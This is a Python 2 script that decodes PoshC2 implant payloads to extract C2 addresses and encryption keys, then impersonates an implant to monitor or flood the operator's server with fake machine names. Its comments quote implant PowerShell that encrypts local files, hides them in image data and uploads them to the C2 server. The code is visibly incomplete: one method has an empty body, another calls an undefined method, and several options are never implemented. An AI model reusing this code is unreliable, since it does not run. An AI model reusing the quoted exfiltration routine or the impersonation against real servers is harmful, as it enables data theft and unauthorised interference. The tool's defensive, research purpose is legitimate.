#!/usr/bin/env python
# Find, monitor and troll a PoshC2 server

import zlib, argparse, os, sys, re, requests, subprocess, datetime, time, magic, base64

class PoshC2Payload:
  
  filepath = None
  useragent = None

  def __init__( self, path ):
    if not os.path.isfile( path ):
      print path + ' isn\'t a file'

    self.filepath = path

  # Attempt to pull info out of implant payload
  def analyse( self, connect=False ):
    print self.filepath

    # Get type of file
    with magic.Magic() as m:
      info = m.id_buffer( self.filepath )
    
    # Get file contents and attempt to find where second stage URL is
    if 'ASCII' in info:
      
      # ASCII text
      with open( self.filepath, 'r' ) as f:
        decoded = PoshC2Payload.base64_walk( f.read() )
  
    print decoded

    # Get custom headers
    headernames = [
      'User-Agent',
      'Host',
      'Referer'
    ]
    self.headers = {}
    for h in headernames:
      m = re.search( h + '","([^"]*)"', decoded, re.IGNORECASE )
      if m:
        print h + ': ' + m.group(1)
        self.headers[h] = m.group(1)

    # Get host header
    m = re.search('\$h="([^"]*)"', decoded )
    if m:
      self.headers['Host'] = m.group(1)
      print 'Host header: ' + m.group(1)

    # Get second stage URL
    m = re.search('\$s="([^"]*)"', decoded )
    if m:
      self.secondstage = m.group(1)
      print 'Second stage URL: ' + self.secondstage
    
    # Get encryption key
    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )
    if m:
      self.encryptionkey = m.group(1)
      print 'Encryption key: ' + self.encryptionkey

    # Connect to the C2 as a new implant
    if connect:
      c2 = PoshC2Server()
      c2.key = self.encryptionkey
      c2.username = raw_input('Username:').strip()
      c2.domain = raw_input('Domain:').strip()
      c2.machine = raw_input('Machine:').strip()
      c2.secondstage( self.secondstage, interact=True )
    

  # Recursively attempt to extract and decode base64
  @staticmethod
  def base64_walk( data ):

    # data = data.decode('utf-16le').encode('utf-8')

    # Convert by stripping zero bytes, lol
    s = ''
    for c in data:
      if ord( c ) != 0:
        s += c
    data = s
    # print ''
    # print 'Attempting to get data from: ' + data

    # Find all base64 strings
    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )
    
    if len( m ) == 0:
      print 'No more base64 found'
      return data

    # Join into one string
    b64 = ''.join(m)
    # print 'Found: ' + b64
    
    decoded = base64.b64decode( b64 )

    # Deflated?
    decompress = zlib.decompressobj(
      -zlib.MAX_WBITS  # see above
    )
    try:
      d = decompress.decompress( decoded )
      if d:
        print 'Data is compressed'
        decoded = d
    except:
      print 'Data is not compressed'

    # Check if the data now contains a user agent, URL 
    m = re.search(r'user-agent',decoded,re.IGNORECASE)
    if m:
      return decoded
    
    return PoshC2Payload.base64_walk( decoded )


class PoshC2Server:

  host = None
  hostheader = None
  key = None
  useragent = None
  referer = None
  cookie = None
  pid = None
  username = None
  domain = None
  cookies = None
  debug = False
  sleeptime = 5

  def __init__( self, host=None, hostheader=None ):
    
    self.session = requests.Session()
    self.host = host
    if not hostheader:
      self.hostheader = host
    else:
      self.hostheader = hostheader

  def do_request( self, url, data=None ):
    
    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):
    headers = {
      'Host': self.hostheader,
      'Referer': self.referer,
      'User-Agent': self.useragent,
      'Cookie': self.cookie
    }
    if len(self.session.cookies) > 0:
      cookies = requests.utils.dict_from_cookiejar(self.session.cookies)
      cookies['SessionID'] = self.cookie
      print 'Including cookies'
      print self.cookie
    method = 'GET'

    try:
      if method == 'POST':
        response = self.session.post(url, data=data, headers=headers, verify=False, files=files, stream=stream )
      elif method == 'GET':
        if data:
          response = self.session.get(url, params=data, headers=headers, verify=False )
        else:
          response = self.session.get(url, headers=headers, verify=False )
    except:
      e = sys.exc_info()[1]
      print 'Request failed: ' + str( e ), 'fail' 
      return False

    if self.debug: 
      print response
      print response.text   
    if response.status_code == 200:
      return response.text
    self.error = response
    if self.debug:
      print self.error
    return False

  def get_encryption( self, iv='0123456789ABCDEF' ):
    from Crypto.Cipher import AES
    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )
    return aes

  # Encrypt a string and base64 encode it
  def encrypt( self, data ):
    # function ENC ($key,$un){
    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)
    # $a = CAM $key
    # $e = $a.CreateEncryptor()
    # $f = $e.TransformFinalBlock($b, 0, $b.Length)
    # [byte[]] $p = $a.IV + $f
    # [System.Convert]::ToBase64String($p)
    # }

    # Pad with zeros
   
    mod = len(data) % 16
    if mod != 0:
      newlen = len(data) + (16-mod)
      data = data.ljust( newlen, '\0' )
    aes = self.get_encryption()
    return base64.b64encode( aes.encrypt( data ) )

  # Decrypt a string from base64 encoding 
  def decrypt( self, data ):
    # iv is first 16 bytes of cipher
    iv = data[0:16]
    aes = self.get_encryption(iv)
    return aes.decrypt(base64.b64decode(data))

  def setcookie( self ):
    # $o="$env:userdomain\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221"
    #     asdf\asdf         ;asdf;asdf             ;AMD64                      ;614 ;http://172.16.88.221:80
    # [19]: Seen:01/23/2018 16:33:43 | PID:http://172.16.88.221:80 | Sleep:5 |  @ AMD64 (4236)
    # [20]: Seen:01/23/2018 16:34:49 | PID:4208 | Sleep:5 | DESKTOP-S4K8P4H\user @ DESKTOP-S4K8P4H (AMD64)
    # $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)
    if not self.pid:
      import random
      self.pid = random.randrange(300,9999)
    c = self.domain + '\\\\' 
    c += self.username + ';'
    c += self.username + ';;' 
    c += self.machine + ';AMD64;' 
    c += str( self.pid ) + ';' 
    c += self.host
    print c
    # c = 'blorebank\\\\iain;iain;;BLORELAPTOP;AMD64;1234;http://whatever'
    # print c
    self.cookie = 'SessionId=' + self.encrypt( c )
    print self.cookie

  # Get the second stage
  def secondstage( self, url, interact=False ):
    
    # $o="$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221"
    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o
    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
    self.host = '/'.join(url.split('/')[0:3])
    self.setcookie()
    data = self.do_request( url )
    data = self.decrypt( data )

    # print data

    # Get encryption key, URL
    m = re.search( r'\$key *= *"([^"]+)"', data )
    if m:
      print 'Comms encryption key: ' + m.group(1)
      self.key = m.group(1)
    m = re.search(r'\$Server *= *"([^"]+)"', data )
    if m:
      print 'Comms URL: ' + m.group(1)
      commsurl = m.group(1)
    m = re.search(r'\$sleeptime *= *([0-9]+)', data )
    if m:
      print 'Sleep time: ' + m.group(1)
      self.sleeptime = int(m.group(1))

    if not interact: return True
    
    self.listen( commsurl )
  
  # function GetImgData($cmdoutput) {
  #     $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
  #     
  #     try {$image = $icoimage|get-random}catch{}
  # 
  #     function randomgen 
  #     {
  #         param (
  #             [int]$Length
  #         )
  #         $set = "...................@..........................Tyscf".ToCharArray()
  #         $result = ""
  #         for ($x = 0; $x -lt $Length; $x++) 
  #         {$result += $set | Get-Random}
  #         return $result
  #     }
  #     $imageBytes = [Convert]::FromBase64String($image)
  #     $maxbyteslen = 1500
  #     $maxdatalen = 1500 + ($cmdoutput.Length)
  #     $imagebyteslen = $imageBytes.Length
  #     $paddingbyteslen = $maxbyteslen - $imagebyteslen
  #     $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
  #     $ImageBytesFull = New-Object byte[] $maxdatalen    
  #     [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
  #     [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
  #     [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
  #     $ImageBytesFull
  # }

  # function Download-File
  # {
  #     param
  #     (
  #         [string] $Source
  #     )
  #     try {
  #         $fileName = Resolve-PathSafe $Source
  #         $randomName = Get-RandomName -Length 5
  #         $fileExt = [System.IO.Path]::GetExtension($fileName)
  #         $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
  #         $fullNewname = "$($fileNameOnly)_$($randomName)$($fileExt)"
  #         $bufferSize = 10737418;
  # 
  #         $fs = [System.IO.File]::Open($fileName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite);        
  #         $fileSize =(Get-Item $fileName).Length
  #         
  #         $chunkSize = $fileSize / $bufferSize
  #         $totalChunks = [int][Math]::Ceiling($chunkSize)
  #         if ($totalChunks -lt 1) {$totalChunks = 1}
  #         $totalChunkStr = $totalChunks.ToString("00000")
  #         $totalChunkByte = [System.Text.Encoding]::UTF8.GetBytes($totalChunkStr)
  #         $Chunk = 1
  #         $finfo = new-object System.IO.FileInfo ($fileName)
  #         $size = $finfo.Length
  #         $str = New-Object System.IO.BinaryReader($fs);
  #         do {
  #             $ChunkStr = $Chunk.ToString("00000")
  #             $ChunkedByte = [System.Text.Encoding]::UTF8.GetBytes($ChunkStr)
  #             $preNumbers = New-Object byte[] 10
  #             $preNumbers = ($ChunkedByte+$totalChunkByte)
  #             $readSize = $bufferSize;
  #             $chunkBytes = $str.ReadBytes($readSize);
  #             $ReadCommand = "download-file "+$fullNewname
  #             $ReadCommand = Encrypt-String $key $ReadCommand
  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
  #             $UploadBytes = getimgdata $send
  #             (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
  #             ++$Chunk 
  #         } until (($size -= $bufferSize) -le 0);
  #     } catch {
  #         $Output = "ErrorCmd: " + $error[0]
  #         $ReadCommand = "Error downloading file "+$fullnewname
  #         $ReadCommand = Encrypt-String $key $ReadCommand  
  #         $send = Encrypt-String2 $key $output
  #         $UploadBytes = getimgdata $send
  #         (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
  #     } 
  # }

  def uploadfile( self, localpath, remotepath ):
    


  # Listen to incoming commands
  def listen( self, url ):
    print 'Listening to server on comms URL: ' + url
    while True:
      data = self.do_request( url )
      print data
      print base64.b64decode( data )
      print self.decrypt( data )
      time.sleep( self.sleeptime )
    return False

  # rickroll the server
  def rickroll( self, username=None, domain=None ):
    thisdir = os.path.dirname(os.path.realpath(__file__))
    wordsfile = thisdir + '/nevergonna.txt'
    self.spam( wordsfile, username, domain )

  # Spray the contents of a txt file at the server as machine names
  def spam( self, wordsfile, username=None, domain=None ):
    try:
      with open( wordsfile, 'r' ) as f:
        lines = f.readlines()
    except:
      print 'Failed to open ' + wordsfile
      return False

    for line in lines:
      self.connect( username, domain, line )
      time.sleep( 1 )

    return True
        

def main():
  
  # Command line options
  parser = argparse.ArgumentParser(description="Find, monitor and troll a PoshC2 server")
  parser.add_argument("-k", "--key", help="Comms encryption key" )
  parser.add_argument("-U", "--useragent", help="User-agent string" )
  parser.add_argument("-r", "--referer", help="Referer string" )
  parser.add_argument("-H", "--host", help="Host name to connect to" )
  parser.add_argument("-g", "--hostheader", help="Host header for domain fronted servers")
  parser.add_argument("-d", "--domain", help="Windows domain name to claim to be in")
  parser.add_argument("-u", "--user", help="Windows user to claim to be connecting as")
  parser.add_argument("-m", "--machine", help="Machine hostname to claim to be connecting as")
  parser.add_argument("-a", "--analyse", help="Analyse an implant payload to discover C2 server")
  parser.add_argument("--connect", action='store_true', help="Connect to the C2 as a new implant if analysis worked")

  parser.add_argument("-s", "--secondstage", help="Attempt to download second stage string and discover comms URL and key")
  parser.add_argument("--scan", help="Scan an IP address range for servers")
  parser.add_argument("--watch", action='store_true', help="Connect and monitor commands as they come in")
  parser.add_argument("--spam", metavar="TEXTFILE", help="Spam the connected implants screen with content from this text file")
  parser.add_argument("--rickroll", action='store_true', help="Spam with the entire lyrics to Never Gonna Give You Up")
  parser.add_argument("--debug", help="Output search commands")
  if len( sys.argv)==1:
    parser.print_help()
    sys.exit(1)
  args = parser.parse_args()

  if args.analyse:
    payload = PoshC2Payload( args.analyse )   
    payload.analyse( args.connect )
    return True

  
  c2 = PoshC2Server()
  c2.useragent = args.useragent
  c2.referer = args.referer
  c2.key = args.key
  c2.domain = args.domain
  c2.username = args.user
  c2.machine = args.machine
  c2.host = args.host


  if args.secondstage:
    if not args.key: 
      print 'Print encryption key required'
      return False
    if not args.useragent:
      args.useragent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko'

    c2.secondstage( args.secondstage )

if __name__ == "__main__":
  main()
